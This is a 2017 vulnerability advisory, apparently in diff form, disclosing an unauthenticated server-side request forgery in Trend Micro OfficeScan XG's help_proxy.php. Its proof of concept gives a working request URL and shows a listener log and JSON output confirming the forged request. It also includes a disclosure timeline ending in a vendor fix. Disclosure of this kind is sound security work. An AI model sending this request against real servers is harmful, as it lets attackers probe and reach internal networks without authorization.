@@ -1,0 +1,89 @@
+[+] Credits: John Page (aka hyp3rlinx)	
+[+] Website: hyp3rlinx.altervista.org
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/TRENDMICRO-OFFICESCAN-XG-SERVER-SIDE-REQUEST-FORGERY.txt
+[+] ISR: ApparitionSec            
+ 
+
+
+Vendor:
+==================
+www.trendmicro.com
+
+
+
+Product:
+===========
+OfficeScan 
+v11.0 and XG (12.0)*
+
+
+OfficeScan protects enterprise networks from malware, network viruses, web-based threats, spyware, and mixed threat attacks.
+An integrated solution, OfficeScan consists of the OfficeScan agent program that resides at the endpoint and a server program that
+manages all agents. The OfficeScan agent guards the endpoint and reports its security status to the server. The server, through the
+web-based management console, makes it easy to set coordinated security policies and deploy updates to every agent.
+
+
+
+Vulnerability Type:
+===================
+Unautherized Server Side Request Forgery
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Security Issue:
+================
+Unauthorized LAN attackers that can reach the OfficeScan XG application can make arbitrary HTTP requests to external and internal servers.
+Abusing a Server Side Request Forgery flaw in the "help_Proxy.php" functionality.
+
+
+
+
+Exploit/POC:
+=============
+https://VICTIM-IP:4343/officescan/console/html/Widget/help_proxy.php?url=http://<REQUESTED-IP>:8080
+
+python -m SimpleHTTPServer 8080
+Serving HTTP on 0.0.0.0 port 8080 ...
+
+<REQUESTED-IP> - - [31/May/2017 12:21:41] "GET / HTTP/1.1" 200 -
+
+help_proxy.php HTTP response:
+{"request_url":"http:\/\/<REQUESTED-IP>:8080","http_code":200,"flag":1}
+
+
+Network Access:
+===============
+Remote
+
+
+
+Severity:
+=========
+Medium
+
+
+
+Disclosure Timeline:
+=============================
+Vendor Notification:  May 31, 2017
+Vendor reply: "We confirmed that this is a valid vulnerability. We are now working on a hotfix to remediate the issue." : June 30, 2017
+Vendor releases fixes / advisory : September 27, 2017
+September 28, 2017 : Public Disclosure
+
+
+
+[+] Disclaimer
+The information contained within this advisory is supplied "as-is" with no warranties or guarantees of fitness of use or otherwise.
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and
+that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit
+is given to the author. The author is not responsible for any misuse of the information contained herein and accepts no responsibility
+for any damage caused by the use or misuse of this information. The author prohibits any malicious use of security related information
+or exploits by the author or elsewhere. All content (c).
+
+hyp3rlinx
